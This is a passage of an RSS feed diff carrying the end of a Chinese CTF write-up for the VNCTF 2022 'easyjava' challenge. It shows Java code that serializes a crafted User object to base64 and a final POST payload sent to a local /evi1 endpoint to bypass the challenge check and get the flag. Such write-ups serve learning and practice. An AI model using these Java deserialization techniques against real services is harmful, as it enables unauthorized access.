+	&lt;a href=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220304094934553.png&#34; data-size=&#34;590x98&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220304094934553.png&#34;
+			width=&#34;590&#34;
+			height=&#34;98&#34;
+			srcset=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220304094934553_hu60848142f5da1e895606218e686c7fe0_14626_480x0_resize_box_3.png 480w, https://example.com/2022/vnctf2022-easyjava/image-20220304094934553_hu60848142f5da1e895606218e686c7fe0_14626_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220304094934553&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220304094934553&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 这里又有一个问题，就是在User类里面重写了readObject，这一行代码存在的时候，反序列化一定会失败，但是注释掉之后是可以看到height为null的。&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;this.height = (String) s.readObject();
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;在User类里面重写一个writeObject&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;    private void writeObject(ObjectOutputStream s) throws IOException{
+        s.defaultWriteObject();
+        s.writeObject(&amp;quot;180&amp;quot;);
+    }
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这样就可以成功进入if判断，拿到flag。&lt;/p&gt;
+&lt;p&gt;自己写一个serialize类，输出需要的base64字符串，同时查看一下user2的属性情况。&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;import java.io.*;
+import java.util.Base64;
+
+import entity.User;
+import util.SerAndDe;
+
+public class serialize {
+    public static void main(String[] args) throws IOException, ClassNotFoundException {
+        User u = new User(&amp;quot;m4n_q1u_666&amp;quot;,&amp;quot;666&amp;quot;,&amp;quot;180&amp;quot;);
+        byte[] user = SerAndDe.serialize(u);
+        String poc = Base64.getEncoder().encodeToString(user);
+        System.out.println(poc);
+        byte[] user2 = Base64.getDecoder().decode(poc);
+        System.out.println(SerAndDe.deserialize(user2).toString());
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;结果如下&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 2327; 
+			flex-basis: 5586px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220304100044543.png&#34; data-size=&#34;1350x58&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220304100044543.png&#34;
+			width=&#34;1350&#34;
+			height=&#34;58&#34;
+			srcset=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220304100044543_hu4221defdfba4abc39916e57b8bc312da_17763_480x0_resize_box_3.png 480w, https://example.com/2022/vnctf2022-easyjava/image-20220304100044543_hu4221defdfba4abc39916e57b8bc312da_17763_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220304100044543&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220304100044543&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;本地没有flag，参考le1a师傅的复现过程，在本地弹个计算器。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 370; 
+			flex-basis: 889px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220304100736444.png&#34; data-size=&#34;1119x302&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220304100736444.png&#34;
+			width=&#34;1119&#34;
+			height=&#34;302&#34;
+			srcset=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220304100736444_hue25f9f52739079915e00efd0185305a2_57871_480x0_resize_box_3.png 480w, https://example.com/2022/vnctf2022-easyjava/image-20220304100736444_hue25f9f52739079915e00efd0185305a2_57871_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220304100736444&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220304100736444&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;payload&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://127.0.0.1:8080/evi1
+post:key=SjveAUeJxYXPww2Dd0NPwUm90na98of1&amp;amp;base64=rO0ABXNyAAtlbnRpdHkuVXNlcm1aqowD0DcIAwACTAADYWdldAASTGphdmEvbGFuZy9TdHJpbmc7TAAEbmFtZXEAfgABeHB0AAM2NjZ0AAttNG5fcTF1XzY2NnQAAzE4MHg=
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;大功告成！&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 217; 
+			flex-basis: 522px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220304101021208.png&#34; data-size=&#34;1488x683&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220304101021208.png&#34;
+			width=&#34;1488&#34;
+			height=&#34;683&#34;
+			srcset=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220304101021208_hud8e2fb32b1bb51a647c35be3823f2bd0_229692_480x0_resize_box_3.png 480w, https://example.com/2022/vnctf2022-easyjava/image-20220304101021208_hud8e2fb32b1bb51a647c35be3823f2bd0_229692_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220304101021208&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220304101021208&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h3 id=&#34;一些奇怪的姿势&#34;&gt;一些奇怪的姿势&lt;/h3&gt;
+&lt;p&gt;之前没有搭过tomcat，所以在搭建环境的过程中有些吃力。完整的搭建过程之后有空了在搞叭，这里用的办法是用编译好的文件替换掉tomcat自带的ROOT。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 195; 
+			flex-basis: 469px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220302132904237.png&#34; data-size=&#34;497x254&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220302132904237.png&#34;
+			width=&#34;497&#34;
+			height=&#34;254&#34;
+			srcset=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220302132904237_hu81ded43b38c768d707b5630daf65ec12_21801_480x0_resize_box_3.png 480w, https://example.com/2022/vnctf2022-easyjava/image-20220302132904237_hu81ded43b38c768d707b5630daf65ec12_21801_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220302132904237&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220302132904237&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;在做的过程中发现也可以通过这个办法骗过编译器，当然前提是需要知道类里有哪些方法，否则会出现找不到调用的方法之类的错误。&lt;/p&gt;
+&lt;h3 id=&#34;参考资料&#34;&gt;参考资料&lt;/h3&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.le1a.com/posts/c1419327/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Le1a师傅的wp&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://note.tonycrane.cc/assets/images/writeups/vnctf2022/VNCTF%202022%20Official%20WriteUp.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;VNCTF 2022 Official WriteUp&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/u010156024/article/details/48345257?utm_medium=distribute.wap_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_v31_ecpm-1-48345257.wap_agg_so&amp;amp;utm_term=volatile%E5%BA%8F%E5%88%97%E5%8C%96&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;java-Transient关键字、Volatile关键字介绍和序列化、反序列化机制、单例类序列化&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/solitudi/article/details/122781947?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164636037116780269890558%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;amp;request_id=164636037116780269890558&amp;amp;biz_id=0&amp;amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-122781947.nonecase&amp;amp;utm_term=servlet&amp;amp;spm=1018.2226.3001.4450&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Servlet的线程安全问题&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;写在后面&#34;&gt;写在后面&lt;/h3&gt;
+&lt;p&gt;这是不知道隔了多久之后重新开始打比赛，并且认认真真地复现。虽然比赛过程中没有做出来，但是成就感满满，也学到了很多东西。作为一名不合格的web手，只能期望日后多push自己一下，好好打比赛好好写题，最重要的是表哥们带带我(●&amp;rsquo;◡&amp;rsquo;●)&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
